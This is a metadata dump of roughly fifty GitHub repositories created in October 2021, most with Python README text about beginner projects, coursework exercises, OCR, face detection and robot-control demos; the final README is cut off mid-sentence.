418034209;red-neuronal-python-excel;https://github.com/metantonio/red-neuronal-python-excel;Python;2021-10-17T05:51:25Z;0;0;0;Este script en python se realizó para demostrar cómo una red neuronal simple se puede programar en python Está hecho pensando en usuarios nuevos. Descargar los archivos en una misma carpeta. Qué se necesita si soy usuario de Windows 10? Se necesita tener instalado Python 3.9 (preferiblemente), el cual puede descargarse desde la tienda oficial de Microsoft de forma gratuita.  Python 3.9  También es necesario instalar algunas dependencias de Python la primera vez para el correcto funcionamiento del script, para esto tan sólo se debe dar doble click al archivo: instalar dependencias.bat. Si por el contrario, se desean instalar las dependencias de Python de forma manual, es necesario ejecutar las siguientes líneas de código en el prompt (parece repetir, pero es una forma de evitar errores si hay más de una versión de python en el pc, o más de un usuario incluso en windows): pip3 install pandas python3 -m pip install --upgrade pip pip3 install matplotlib python -m pip install --upgrade pip python3 -m pip install matplotlib --user python3 -m pip install xlrd --user Cómo ejecuto el script de Python? Para ejecutar el script, basta con darle doble click al archivo: Run main.bat. Aunque si se desea ejecutar el script manualmente, hay que abrir el prompt de Windows, navegar hasta la dirección en que están contenidos los archivos, y ejecutar: python3 main.py 
417979949;Python-Driver-Communication;https://github.com/ethanedits/Python-Driver-Communication;C++;2021-10-17T00:21:19Z;0;0;0;Python-Driver-Communication A python wrapper that communicates to a C++ func hook driver The actual C++ function hook driver is located in the Driver folder, and needs to mapped using kdmapper.exe. The Wrapper Library is in the UsermodeLibrary folder. The Python Usermode is located in the Usermode folder, with x86 and x64 examples titled x86UsermodeExample.py and x64UsermodeExample.py. (Note: x64 processes/modules must manually be inputted in the Driver) This is temporary and will be changed soon. 
417991348;BUAN-Python-coursework;https://github.com/oliverhering8080/BUAN-Python-coursework;Jupyter Notebook;2021-10-17T01:38:06Z;0;0;0;
417991442;OCR-onscanned-PDF-PYTHON;https://github.com/diogoaraujo/OCR-onscanned-PDF-PYTHON;Python;2021-10-17T01:38:54Z;0;0;0;OCR-on-scanned-PDF-PYTHON Text is extracted from scanned PDF document using OCR in python.The pytesseract,opencv and pdf2image libraries are used. Following steps need to be followed to extract text 1# Convert the pdf file to the images. 2# Images are rotated at a designated angle so text extraction would be feasible. 3# Peform OCR on the images to extract the text. 4# Save the extracted text to a file. 
417995809;Python-CursoemVideo;https://github.com/adrieljp/Python-CursoemVideo;;2021-10-17T02:10:51Z;0;0;0;
418008662;python-django-simple;https://github.com/andresetiawan-as/python-django-simple;Python;2021-10-17T03:27:44Z;0;0;0;
417983184;fcc_python_projects;https://github.com/samartin2/fcc_python_projects;Python;2021-10-17T00:40:40Z;0;0;0;fcc_python_projects This repository contains Python projects completed through freecodecamp.org for the Scientific Computing with Python certification. The original projects were completed on replit and can be viewed below. Time Calculator: https://replit.com/@smartis2/time-calculator Arithmetic Calculator: https://replit.com/@smartis2/arithmetic-formatter Budget App: https://replit.com/@smartis2/budget-app Polygon Area Calculator: https://replit.com/@smartis2/polygon-area-calculator Probability Calculator: https://replit.com/@smartis2/probability-calculator 
417987507;CtCI-Python-Edition;https://github.com/seraph776/CtCI-Python-Edition;;2021-10-17T01:09:46Z;0;0;0;"Cracking the Coding Interview 6th Edition - Python Solutions  ⭐ Background Info These are Python solutions for the book Cracking the Coding Interview, 6th Edition by Gayle Laakmann McDowell. Cracking the Coding Interview, 6th Edition is here to help you through this process, teaching you what you need to know and enabling you to perform at your very best. Learn how to uncover the hints and hidden details in a question, discover how to break down a problem into manageable chunks, develop techniques to unstick yourself when stuck, learn (or re-learn) core computer science concepts, and practice on 189 interview questions and solutions. These interview questions are real; they are not pulled out of computer science textbooks. They reflect what's truly being asked at the top companies, so that you can be as prepared as possible. WHAT'S INSIDE?  189 programming interview questions, ranging from the basics to the trickiest algorithm problems. A walk-through of how to derive each solution, so that you can learn how to get there yourself. Hints on how to solve each of the 189 questions, just like what you would get in a real interview. Five proven strategies to tackle algorithm questions, so that you can solve questions you haven't seen. Extensive coverage of essential topics, such as big O time, data structures, and core algorithms. A behind the scenes look at how top companies like Google and Facebook hire developers. Techniques to prepare for and ace the soft side of the interview: behavioral questions. For interviewers and companies: details on what makes a good interview question and hiring process.   📋 List of Codng Questions  Click to view Contents Chapter 1   1.1 - Is Unique  1.2 - Check Permutation  1.3 - URLify  1.4 - Palindrome Permutation  1.5 - One Away  1.6 - String Compression  1.7 - Rotate Matrix  1.8 - Zero Matrix  1.9 - String Rotation  Chapter 1   Remove Dups  2.1 - Remove Dups  2.2 - Return Kth to Last  2.3 - Delete Middle Node  2.4 - Partition  2.5 - Sum Lists  2.6 - Palindrome  2.7 - Intersection  2.8 - Loop Detection  Chapter 3   3.1 - Three in One  3.2 - Stack Min  3.3 - Stack of Plates  3.4 - Queue via Stacks  3.5 - Sort Stack  3.6 - Animal Shelter  Chapter 4   4.1 - Route Between Nodes  4.2 - Minimal Tree  4.3 - List of Depths  4.4 - Check Balanced  4.5 - Validate BST  4.6 - Successor  4.7 - Build Order  4.8 - First Common Ancestor  4.9 - BST Sequences  4.10 - Check Subtree  4.11 - Random Node  4.12 - Paths with Sum  Chapter 5   5.1 - Insertion  5.2 - Binary to String  5.3 - Flip Bit To Win  5.4 - Next Number  5.5 - Debugger  5.6 - Conversion  5.7 - Pairwise Swap  5.8 - Draw Line  Chapter 6   6.1 - Heavy Pill  6.2 - Basketball  6.3 - Dominos  6.4 - Ants on a Triangle  6.5 - Jugs of Water  6.6 - Blue-Eyed Island  6.7 - The Apocalypse  6.8 - The Egg Drop Problem  6.9 - 100 Lockers  6.10 - Poison  Chapter 7   7.1 - Deck of Cards  7.2 - Call Center  7.3 - Jukebox  7.4 - Parking Lot  7.5 - Online Book Reader  7.6 - Jigsaw  7.7 - Chat Server  7.8 - Othello  7.9 - Circular Array  7.10 - Minesweeper  7.11 - File System  7.12 - Hash Table  Chapter 8    8.1 - Triple Step   8.2 - Robot in a Grid   8.3 - Magic Index   8.4 - Power Set   8.5 - Recursive Multiply   8.6 - Towers of Hanoi   8.7 - Permutations without Dups   8.8 - Permutations with Dups   8.9 - Parens   8.10 - Paint Fill   8.11 - Coins   8.12 - Eight Queens   8.13 - Stack Boxes   8.14 - Boolean Eval  Chapter 9   9.1 - Stock Data  9.2 - Social Network  9.3 - Web Crawler  9.4 - Duplicate URLs  9.5 - Cache  9.6 - Sales Rank  9.7 - Personal Financial Manager  9.8 - Paste Bin  Chapter 10    10.1 - Sorted Merge   10.2 - Group Anagrams   10.3 - Search In Rotated Array   10.4 - Sorted Search No Size   10.5 - Sparse Search   10.6 - Sort Big File   10.7 - Missing Int   10.8 - Find Duplicates   10.9 - Sorted Matrix Search   10.10 - Rank From Stream   10.11 - Peaks And Valleys    🤝 Contribute Contributions welcome! Please submit separate pull requests for each solution you work on. In general solutions should fall into one of the following three categories:  algorithm demonstration. This is the primary type of problem and solution that the text is concerned with. As such, solutions should not use standard library functions in cases that would make it unnecessary to implement the algorithm. The goal of these solutions should be to have an easy to understand solution that demonstrates understanding of the algorithm. python demonstration. We also accept solutions that solve the problem in a more practical way, using whatever standard library functions are available. Please do not use any third party dependencies. These solutions should also be easy to understand and good examples of pythonic ways of doing things. speed demonstration. These alternative solutions may be accepted if the fastest way to do something is not very readable or intuitive and thus it doesn't fit into the first two categories.   ⚖️ License This project is Public Domain and licensed under the MIT License.   🌎 Contact me If you have any questions about this project, feel free to get in touch.   Contributors    Made with contributors-img. "
418034288;Decision-_tree_using-Python;https://github.com/Naeem2400/Decision-_tree_using-Python;;2021-10-17T05:51:52Z;0;0;0;Decision tree using Python Decision tree is one of the most popular algorithm of Machine Learning 
417980006;python-project-lvl1;https://github.com/OstinPower41016/python-project-lvl1;Makefile;2021-10-17T00:21:31Z;0;0;0;Hexlet tests and linter status:  
417986414;2DVideoGamePython;https://github.com/youssef032/2DVideoGamePython;Python;2021-10-17T01:01:53Z;0;0;0;2DVideoGamePython 
418037185;python_pro._1;https://github.com/abhishekrajv1408/python_pro._1;Python;2021-10-17T06:07:15Z;0;0;0;python_pro._1 
418000013;InterfaceGrafica-Python;https://github.com/StartCode-YT/InterfaceGrafica-Python;Python;2021-10-17T02:32:57Z;0;0;0;InterfaceGrafica-Python Neste projeto, desenvolvo uma interface gráfica simples e estilosa para visualizar o projeto utilizando Python. De uma forma muito simples, mostro como é possível adicionar imagens, links externos e um botão na interface gráfica. O desenvolvimento do projeto completo está no YouTube, aqui esta o link do vídeo:https://www.youtube.com/watch?v=V2wNayCmDgY&ab_channel=StartCode   YouTube: https://www.youtube.com/channel/UCz-So8ofG_CO9qOEAmoFtYw   TikTok: https://www.tiktok.com/@startcode_?lang=pt-BR   Instagram: https://www.instagram.com/startcode_oficial/?hl=pt-br  Start Code 🌎    
417994165;python-react-crud;https://github.com/falcon-flask/python-react-crud;Python;2021-10-17T01:59:35Z;0;0;0;python-react-crud $ source venv/bin/activate $ deactivate $ python3 backend/src/app.py  
418030564;PPT-using-Python;https://github.com/abhifrm/PPT-using-Python;Python;2021-10-17T05:31:53Z;0;0;0;
418001307;Python-Random-Name-Generator;https://github.com/free32com/Python-Random-Name-Generator;Python;2021-10-17T02:41:31Z;0;0;0;Python-Random-Name-Generator       Outputs RANDOM People names, US state, counties and addresses, Countries and Company names. Useful for testing Name/Address fields with random data.  Installation   No dependencies required. Just pure Python v3+   Simply download the repo to your project folder or   git clone https://github.com/navchandar/Python-Random-Name-Generator.git   And start using for your development/testing purposes.   Please add your ideas/suggestions or more test data here.   Usage import random_names random_names.First()        # outputs random first name random_names.Middle()       # outputs random middle name random_names.Last()         # outputs random last name random_names.Full()         # outputs random first and last name random_names.Company()      # outputs random company name random_names.Address()      # outputs random Address random_names.StateCode()    # outputs random US State Code random_names.States()       # outputs random US State name random_names.Country()      # outputs random Country name random_names.Places()       # outputs random Place name Donate    
418004235;Python-Practice-Projects;https://github.com/pswans/Python-Practice-Projects;Python;2021-10-17T02:59:21Z;0;0;0;Practice-Projects Basic projects used to help build a foundation for code. 
417997743;poject_Python-curses_Test;https://github.com/samdi0316/poject_Python-curses_Test;;2021-10-17T02:20:34Z;0;0;0;
417998073;flashing-heart-Python;https://github.com/Tuppote/flashing-heart-Python;TypeScript;2021-10-17T02:22:17Z;0;0;0;" このページを開く https://tuppote.github.io/flashing-heart-python/  拡張機能として使用 このリポジトリは、MakeCode で 拡張機能 として追加できます。  https://makecode.microbit.org/ を開く 新しいプロジェクト をクリックしてください ギアボタンメニューの中にある 拡張機能 をクリックしてください https://github.com/tuppote/flashing-heart-python を検索してインポートします。  このプロジェクトを編集します  MakeCode でこのリポジトリを編集します。  https://makecode.microbit.org/ を開く 読み込む をクリックし、 URLから読み込む... をクリックしてください https://github.com/tuppote/flashing-heart-python を貼り付けてインポートをクリックしてください  ブロックのプレビュー この画像はマスター内の最後のコミットからのブロックコードを示しています。 このイメージは更新に数分かかる場合があります。  メタデータ (検索、レンダリングに使用)  for PXT/microbit  <script src=""https://makecode.com/gh-pages-embed.js""></script><script>makeCodeRender(""{{ site.makecode.home_url }}"", ""{{ site.github.owner_name }}/{{ site.github.repository_name }}"");</script> "
418012329;Data-Visualization-with-Python;https://github.com/Leahvv/Data-Visualization-with-Python;Jupyter Notebook;2021-10-17T03:52:03Z;0;0;0;
417981875;Orientacao_a_objetos_Python;https://github.com/camila-marquesbr/Orientacao_a_objetos_Python;Python;2021-10-17T00:31:36Z;0;0;0;
417990680;python-projects-book;https://github.com/JahimerGarcia/python-projects-book;;2021-10-17T01:32:47Z;0;0;0;Python crash course book This repositorie have three projects on python(just for learning)  Alien invasion game Data visualization A web app  It's important to put in practice all that I've learned about python.  variables conditional lists and dictionarys bucles functions classes unit tests good practices of code  
417994790;Python-Programers-Note-Competitive-;https://github.com/MdNazmul9/Python-Programers-Note-Competitive-;;2021-10-17T02:03:29Z;0;0;0;Python-Programers-Note-Competitive- Smallest positive float64 number import numpy as np np.finfo(np.float64).eps = 2.2204460492503131e-16 np.finfo(np.float64).tiny = 2.2250738585072014e-308  # OR  np.nextafter(0, 1) np.nextafter(np.float32(0), np.float32(1))   
417994472;CS_202_Python;https://github.com/R0Y101101/CS_202_Python;Python;2021-10-17T02:01:22Z;0;0;0;CS_202_Python 
418009730;DeepLearning-Python-Test;https://github.com/hot6-vitalenergy/DeepLearning-Python-Test;;2021-10-17T03:34:31Z;0;0;0;
418030127;python_by_example_challenges;https://github.com/saeidxgholami/python_by_example_challenges;;2021-10-17T05:29:43Z;0;0;0;
418033148;lambda-apigw-python-rds;https://github.com/Bhaskar-Sadipiralla/lambda-apigw-python-rds;Python;2021-10-17T05:45:32Z;0;0;0;
418037843;Brute-Force-Cracker-Python;https://github.com/tschecurity/Brute-Force-Cracker-Python;;2021-10-17T06:10:37Z;0;0;0;Brute-Force-Cracker-Python Wanted to learn the process of brute forcing, cracking passwords with Python. Found code on Stack Overflow to learn how brute forcing works when changing constants of a string. 
418034515;Basic-Capture-Camera;https://github.com/RamadanYosiPratama/Basic-Capture-Camera;;2021-10-17T05:53:14Z;0;0;0;
418012027;student-python-introduction-developer-ongar;https://github.com/alem-classroom/student-python-introduction-developer-ongar;Python;2021-10-17T03:50:11Z;1;1;0;Autograding Example: Python This example project is written in Python, and tested with pytest. The assignment The tests are failing right now because the method isn't outputting the correct string. Fixing this up will make the tests green. Setup command sudo -H pip3 install pytest Run command pytest Notes  pip's install path is not included in the PATH var by default, so without installing via sudo -H, pytest would be unaccessible.  
418006140;face-recognition-attendance-in-python;https://github.com/sayhaleluya/face-recognition-attendance-in-python;;2021-10-17T03:10:37Z;0;0;0;
418002472;Python-JavaScript-CS50;https://github.com/ne3naikin/Python-JavaScript-CS50;;2021-10-17T02:48:32Z;0;0;0;
417992353;Core-Python---Classes-and-object;https://github.com/rakib06/Core-Python---Classes-and-object;Python;2021-10-17T01:46:15Z;0;0;0; Agenda  Defining per-class Using properties Represent your objects as strings Method resolution Transforming classes with class-decorators Creating simple data classes  you'll know how to create idiomatic Python classes Prerequisites:  Essentials of python Functions, classes and modules Core Python: Getting Started Core Python: Functions and Functional Programming  Scopes in Python (LEGB)  local => inside the current function Enclosing => inside enclosing functions Global => At the top level of the module Built-in => In the special builtins module  The zen of python  Explicit is better than implicit Readability counts There  is no class class scope in python  
418010553;IBM-Python-Project-Module-5;https://github.com/karsynplunkett/IBM-Python-Project-Module-5;Jupyter Notebook;2021-10-17T03:40:16Z;0;0;0;
418002108;Python_Web_scraping_Self_Study;https://github.com/KPW10452025/Python_Web_scraping_Self_Study;Python;2021-10-17T02:46:28Z;0;0;0;
417993799;lldb-but-control-by-python;https://github.com/lixiangwuxian/lldb-but-control-by-python;;2021-10-17T01:56:53Z;0;0;0;
418033883;First-Project-on-Basic-Python;https://github.com/runjhunsigh/First-Project-on-Basic-Python;Jupyter Notebook;2021-10-17T05:49:32Z;0;0;0;First-Project-on-Basic-Python 
418012012;ShapeAI-Python-Bootcamp-Project;https://github.com/Arka-Saha/ShapeAI-Python-Bootcamp-Project;Python;2021-10-17T03:50:05Z;0;0;0;"ShapeAI WebScrapping and Automation With Python Project  Name: Arka Saha Email: i.am.arka.saha@gmail.com Output can be viewed in the ""players.xlsx"" file.   THANK YOU! "
418007169;Servidor-em-python-socket-UDP-;https://github.com/marcelucasales/Servidor-em-python-socket-UDP-;Python;2021-10-17T03:17:15Z;0;0;0;
417986380;slackapp-python-based-on-events;https://github.com/alvincly77/slackapp-python-based-on-events;;2021-10-17T01:01:44Z;0;0;0;slackapp-python-based-on-events 
418011124;TCP-IP-Python-Demo-master;https://github.com/Huxuanxian/TCP-IP-Python-Demo-master;Python;2021-10-17T03:44:12Z;0;0;0;先读我 1. 运行 Demo 需以下步骤   电脑可用网线连接控制器的网口，然后设置固定 IP，与控制器 IP 在同一网段下。也可无线连接控制器。  四轴机器人（如MG400等）     有线连接时连接LAN1：ip为192.168.1.6 , 有线连接时连接LAN2：ip为192.168.2.6,  无线连接：ip为192.168.9.1 六轴机器人（如CR系列等）    有线连接：ip为192.168.5.1 , 无线连接：ip为192.168.1.6    尝试 ping 通控制器 IP，确保在同一网段下。   2. 文件说明   demo.py: 程序运行入口。   dobot_api.py：根据机器人TCP/IP远程控制方案（https://github.com/Dobot-Arm/TCP-IP-Protocol）自行修改。   3. 运行Demo 方法一: 需要检测搜索到动态库，需在VsCode中打开整个目录，再直接运行 demo.py。 方法二: 需要检测搜索到动态库，需在PyCharm中打开整个目录，再直接运行 demo.py。 4. 测试环境  language: Python 3.7 64-bit os: Windows 10 64-bit  5.控制器版本 可以使用TCP/IP协议的控制器版本如下：  MG400： 1.5.4.0 及以上 CR： 3.5.1.9 及以上   Readme 1. The following steps are required to run Demo   The computer can be connected to the network port of the controller with a network cable, and then set a fixed IP, which is in the same network segment as the controller IP. The controller can also be connected wirelessly.  Four-axis robots (such as MG400, etc.) When wired connection is connected to LAN1: ip is 192.168.1.6, when wired connection is connected to LAN2: ip is 192.168.2.6, wireless connection: ip is 192.168.9.1 . Six-axis robot (such as CR series, etc.) Wired connection: ip is 192.168.5.1 ,Wireless connection: ip is 192.168.1.6 .    Try to ping the controller IP to make sure it is in the same network segment.   2. File description   demo.py: The entry point of the program.   dobot_api.py: According to the robot TCP/IP remote control scheme (https://github.com/Dobot-Arm/TCP-IP-Protocol), modify it by yourself.   3. Run Demo Method 1: If you need to detect and search the dynamic library, you need to open the entire directory in VsCode, and then run demo.py directly. Method 2: To detect and search the dynamic library, you need to open the entire directory in PyCharm, and then run demo.py directly. 4. Test environment  language: Python 3.7 64-bit os: Windows 10 64-bit  5. Controller version The controller versions that can use the TCP/IP protocol are as follows:  MG400: 1.5.4.0 and above CR: 3.5.1.9 and above  
417985716;fcc-data-analysis-with-python;https://github.com/nameer1811/fcc-data-analysis-with-python;Python;2021-10-17T00:57:20Z;0;0;0;
418032135;Basic-Python-for-Data-Science;https://github.com/sitong-liu-996/Basic-Python-for-Data-Science;Jupyter Notebook;2021-10-17T05:39:51Z;0;0;0;Basic-Python-for-Data-Science from Coursera 
418020002;tutorial-pybr;https://github.com/carv-silva/tutorial-pybr;;2021-10-17T04:36:04Z;0;0;0;tutorial-pybr Tutorial Construindo API's robustas utilizando Python (Python Brasil) 
418029987;elkpython;https://github.com/ronidas39/elkpython;;2021-10-17T05:28:56Z;0;0;0;elkpython elasticsearch with python 
417981470;Hangman;https://github.com/Valegdev/Hangman;Python;2021-10-17T00:29:26Z;0;0;0;Hangman 💚   Hangman game in python !!                          \|||/                          (o o)                 ------ooO-(_)-Ooo------    
418032483;Rock.Paper.Scissor-Game;https://github.com/devsandanayake/Rock.Paper.Scissor-Game;Python;2021-10-17T05:41:43Z;0;0;0;Rock.Paper.Scissor-Game python simple game 
418008211;little-sisters-vocab;https://github.com/meganriley/little-sisters-vocab;Python;2021-10-17T03:24:37Z;0;0;0;"Little Sister's Vocabulary Welcome to Little Sister's Vocabulary on Exercism's Python Track. If you need help running the tests or submitting your code, check out HELP.md. If you get stuck on the exercise, check out HINTS.md, but try and solve it without using those first :) Introduction A str in Python is an immutable sequence of Unicode code points. These could include letters, diacritical marks, positioning characters, numbers, currency symbols, emoji, punctuation, space and line break characters, and more. Being immutable, a str object's value in memory doesn't change; methods that appear to modify a string return a new copy or instance of that str object. A str literal can be declared via single ' or double "" quotes. The escape \ character is available as needed. >>> single_quoted = 'These allow ""double quoting"" without ""escape"" characters.'  >>> double_quoted = ""These allow embedded 'single quoting', so you don't have to use an 'escape' character"".  >>> escapes = 'If needed, a \'slash\' can be used as an escape character within a string when switching quote styles won\'t work.' Multi-line strings are declared with ''' or """""". >>> triple_quoted =  '''Three single quotes or ""double quotes"" in a row allow for multi-line string literals.   Line break characters, tabs and other whitespace are fully supported.    You\'ll most often encounter these as ""doc strings"" or ""doc tests"" written just below the first line of a function or class definition.     They\'re often used with auto documentation ✍ tools.     ''' Strings can be concatenated using the + operator. This method should be used sparingly, as it is not very performant or easily maintained. language = ""Ukrainian"" number = ""nine"" word = ""девять""  sentence = word + "" "" + ""means"" + "" "" + number + "" in "" + language + "".""  >>> print(sentence) ... ""девять means nine in Ukrainian."" If a list, tuple, set or other collection of individual strings needs to be combined into a single str, <str>.join(<iterable>), is a better option: # str.join() makes a new string from the iterables elements. >>> chickens = [""hen"", ""egg"", ""rooster""] >>> ' '.join(chickens) 'hen egg rooster'  # Any string can be used as the joining element. >>> ' :: '.join(chickens) 'hen :: egg :: rooster'  >>> ' 🌿 '.join(chickens) 'hen 🌿 egg 🌿 rooster' Code points within a str can be referenced by 0-based index number from the left: creative = '창의적인'  >>> creative[0] '창'  >>> creative[2] '적'  >>> creative[3] '인' Indexing also works from the right, starting with a -1-based index: creative = '창의적인'  >>> creative[-4] '창'  >>> creative[-2] '적'  >>> creative[-1] '인' There is no separate “character” or ""rune"" type in Python, so indexing a string produces a new str of length 1: >>> website = ""exercism"" >>> type(website[0]) <class 'str'>  >>> len(website[0]) 1  >>> website[0] == website[0:1] == 'e' True Substrings can be selected via slice notation, using <str>[<start>:stop:<step>] to produce a new string. Results exclude the stop index. If no start is given, the starting index will be 0. If no stop is given, the stop index will be the end of the string. moon_and_stars = '🌟🌟🌙🌟🌟⭐' sun_and_moon = '🌞🌙🌞🌙🌞🌙🌞🌙🌞'  >>> moon_and_stars[1:4] '🌟🌙🌟'  >>> moon_and_stars[:3] '🌟🌟🌙'  >>> moon_and_stars[3:] '🌟🌟⭐'  >>> moon_and_stars[:-1] '🌟🌟🌙🌟🌟'  >>> moon_and_stars[:-3] '🌟🌟🌙'  >>> sun_and_moon[::2] '🌞🌞🌞🌞🌞'  >>> sun_and_moon[:-2:2] '🌞🌞🌞🌞'  >>> sun_and_moon[1:-1:2] '🌙🌙🌙🌙' Strings can also be broken into smaller strings via <str>.split(<separator>), which will return a list of substrings. The list can then be further indexed or split, if needed. Using <str>.split() without any arguments will split the string on whitespace. >>> cat_ipsum = ""Destroy house in 5 seconds mock the hooman."" >>> cat_ipsum.split() ... ['Destroy', 'house', 'in', '5', 'seconds', 'mock', 'the', 'hooman.']   >>> cat_ipsum.split()[-1] 'hooman.'   >>> cat_words = ""feline, four-footed, ferocious, furry"" >>> cat_words.split(',') ... ['feline', 'four-footed', 'ferocious', 'furry'] Separators for <str>.split() can be more than one character. The whole string is used for split matching. >>> colors = """"""red, orange, green, purple, yellow""""""  >>> colors.split(',\n') ['red', 'orange', 'green', 'purple', 'yellow'] Strings support all common sequence operations. Individual code points can be iterated through in a loop via for item in <str>. Indexes with items can be iterated through in a loop via for index, item in enumerate(<str>). >>> exercise = 'လေ့ကျင့်'  # Note that there are more code points than perceived glyphs or characters >>> for code_point in exercise: ...    print(code_point) ... လ ေ ့ က ျ င ် ့  # Using enumerate will give both the value and index position of each element. >>> for index, code_point in enumerate(exercise): ...    print(index, "": "", code_point) ... 0 :  လ 1 :  ေ 2 :  ့ 3 :  က 4 :  ျ 5 :  င 6 :  ် 7 :  ့ Instructions You are helping your younger sister with her English vocabulary homework, which she's finding very tedious. Her class is learning to create new words by adding prefixes and suffixes. Given a set of words, the teacher is looking for correctly transformed words with correct spelling by adding the prefix to the beginning or the suffix to the ending. There's four activities in the assignment, each with a set of text or words to work with. 1. Add a prefix to a word One of the most common prefixes in English is un, meaning ""not"". In this activity, your sister needs to make negative, or ""not"" words by adding un to them. Implement the add_prefix_un() function that takes word as a parameter and returns a new un prefixed word: >>> add_prefix_un(""happy"") 'unhappy'  >>> add_prefix_un(""manageable"") 'unmanageable' 2. Add prefixes to word groups There are four more common prefixes that your sister's class is studying: en (meaning to 'put into' or 'cover with'), pre (meaning 'before' or 'forward'), auto (meaning 'self' or 'same'), and inter (meaning 'between' or 'among'). In this exercise, the class is creating groups of vocabulary words using these prefixes, so they can be studied together. Each prefix comes in a list with common words it's used with. The students need to apply the prefix and produce a string that shows the prefix applied to all of the words. Implement the make_word_groups(<vocab_words>) function that takes a vocab_words as a parameter in the following form: [<prefix>, <word_1>, <word_2> .... <word_n>], and returns a string with the prefix applied to each word that looks like: '<prefix> :: <prefix><word_1> :: <prefix><word_2> :: <prefix><word_n>'. >>> make_word_groups(['en', 'close', 'joy', 'lighten']) 'en :: enclose :: enjoy :: enlighten'  >>> make_word_groups(['pre', 'serve', 'dispose', 'position']) 'pre :: preserve :: predispose :: preposition'  >> make_word_groups(['auto', 'didactic', 'graph', 'mate']) 'auto :: autodidactic :: autograph :: automate'  >>> make_word_groups(['inter', 'twine', 'connected', 'dependent']) 'inter :: intertwine :: interconnected :: interdependent' 3. Remove a suffix from a word ness is a common suffix that means 'state of being'. In this activity, your sister needs to find the original root word by removing the ness suffix. But of course there are pesky spelling rules: If the root word originally ended in a consonant followed by a 'y', then the 'y' was changed to to 'i'. Removing 'ness' needs to restore the 'y' in those root words. e.g. happiness --> happi --> happy. Implement the remove_suffix_ness(<word>) function that takes in a word str, and returns the root word without the ness suffix. >>> remove_suffix_ness(""heaviness"") 'heavy'  >>> remove_suffix_ness(""sadness"") 'sad' 4. Extract and transform a word Suffixes are often used to change the part of speech a word has. A common practice in English is ""verbing"" or ""verbifying"" -- where a adjective becomes a verb by adding an en suffix. In this task, your sister is going to practice ""verbing"" words by extracting an adjective from a sentence and turning it into a verb. Fortunately, all the words that need to be transformed here are ""regular"" - they don't need spelling changes to add the suffix. Implement the noun_to_verb(<sentence>, <index>) function that takes two parameters. A sentence using the vocabulary word, and the index of the word, once that sentence is split apart. The function should return the extracted adjective as a verb. >>> noun_to_verb('I need to make that bright.', -1 ) 'brighten'  >>> noun_to_verb('It got dark as the sun set.', 2) 'darken' Source Created by  @aldraco @bethanyg  "
418005093;multiprocessing;https://github.com/mfahadakbar/multiprocessing;Python;2021-10-17T03:04:17Z;0;0;0;multiprocessing & pycaret You can read my blog here : 
417982074;agrobioapi;https://github.com/leroTI/agrobioapi;;2021-10-17T00:32:47Z;0;0;0;agrobioapi Api FLASK PYTHON Agrobiotech 
418032435;Exercises;https://github.com/T-S320402/Exercises;;2021-10-17T05:41:30Z;0;0;0;
418016813;guardrailsio1;https://github.com/Grausichtf/guardrailsio1;;2021-10-17T04:18:45Z;0;0;0;guardrailsio1 Awesome Python Security resources 🕶🐍🔐 
418012241;encouragement_bot;https://github.com/caokhacdung/encouragement_bot;;2021-10-17T03:51:34Z;0;0;0;
418015439;save_image_mysql;https://github.com/ecomy-code/save_image_mysql;Python;2021-10-17T04:11:22Z;0;0;0;
418030151;Data-Analysis-with-Python---Project-1;https://github.com/cailan-j/Data-Analysis-with-Python---Project-1;Python;2021-10-17T05:29:51Z;0;0;0;"Assignment Create a function named calculate() in mean_var_std.py that uses Numpy to output the mean, variance, standard deviation, max, min, and sum of the rows, columns, and elements in a 3 x 3 matrix. The input of the function should be a list containing 9 digits. The function should convert the list into a 3 x 3 Numpy array, and then return a dictionary containing the mean, variance, standard deviation, max, min, and sum along both axes and for the flattened matrix. The returned dictionary should follow this format: {   'mean': [axis1, axis2, flattened],   'variance': [axis1, axis2, flattened],   'standard deviation': [axis1, axis2, flattened],   'max': [axis1, axis2, flattened],   'min': [axis1, axis2, flattened],   'sum': [axis1, axis2, flattened] } If a list containing less than 9 elements is passed into the function, it should raise a ValueError exception with the message: ""List must contain nine numbers."" The values in the returned dictionary should be lists and not Numpy arrays. For example, calculate([0,1,2,3,4,5,6,7,8]) should return: {   'mean': [[3.0, 4.0, 5.0], [1.0, 4.0, 7.0], 4.0],    'variance': [[6.0, 6.0, 6.0], [0.6666666666666666, 0.6666666666666666, 0.6666666666666666], 6.666666666666667],    'standard deviation': [[2.449489742783178, 2.449489742783178, 2.449489742783178], [0.816496580927726, 0.816496580927726, 0.816496580927726], 2.581988897471611],   'max': [[6, 7, 8], [2, 5, 8], 8],   'min': [[0, 1, 2], [0, 3, 6], 0],   'sum': [[9, 12, 15], [3, 12, 21], 36] } The unit tests for this project are in test_module.py. Development For development, you can use main.py to test your calculate() function. Click the ""run"" button and main.py will run. Testing We imported the tests from test_module.py to main.py for your convenience. The tests will run automatically whenever you hit the ""run"" button. Submitting Copy your project's URL and submit it to freeCodeCamp. "
418006669;Face-Detection-in-Python-using-OpenCV;https://github.com/chaojin/Face-Detection-in-Python-using-OpenCV;Jupyter Notebook;2021-10-17T03:14:16Z;0;0;0;Face Detection with Python using OpenCV   Face detection is a computer vision technology that helps to locate/visualize human faces in digital images. This technique is a specific use case of object detection technology that deals with detecting instances of semantic objects of a certain class (such as humans, buildings or cars) in digital images and videos. With the advent of technology, face detection has gained a lot of importance especially in fields like photography, security, and marketing. Objective This is the repository linked to the tutorial with the same name. The idea is to introduce people to the concept of object detection in Python using the OpenCV library and how it can be utilized to perform tasks like Facial detection. Blogpost Face Detection with Python using OpenCV Installation OpenCV-Python supports all the leading platforms like Mac OS, Linux, and Windows. It can be installed in either of the following ways: 1. From pre-built binaries and source : Please refer to the detailed documentation here for Windows and here for Mac. 2. Unofficial pre-built OpenCV packages for Python. Packages for standard desktop environments (Windows, macOS, almost any GNU/Linux distribution) run pip install opencv-python if you need only the main modules run pip install opencv-contrib-python if you need both main and contrib modules (check extra modules listing from OpenCV documentation) Table Of Contents  Images as Arrays Images and OpenCV Basic Operations on Images Face Detection  Images as Arrays An image is nothing but a standard Numpy array containing pixels of data points. More the number of pixels in an image, the better is its resolution. You can think of pixels to be tiny blocks of information arranged in form a 2 D grid and the depth of a pixel refers to the colour information present in it. In order to be  processed by a computer, an image needs to be converted into a binary form. The colour of an image can be calculated as follows:   Number of colours/ shades = 2^bpp where bpp represents bits per pixel.  Naturally, more the number of bits/pixels , more possible colours in the images. The following table shows  the relationship more clearly. Let us now have a look at the representation of the different kinds of images:  Binary Image Grayscale image Coloured image  Images and OpenCV In this section we will perform simple operations on images using OpenCV like opening images, drawing simple shapes on images and interacting with images through callbacks. This is necessary to create a foundation before we move towards the advanced stuff.  Importing Images in OpenCV Open CV 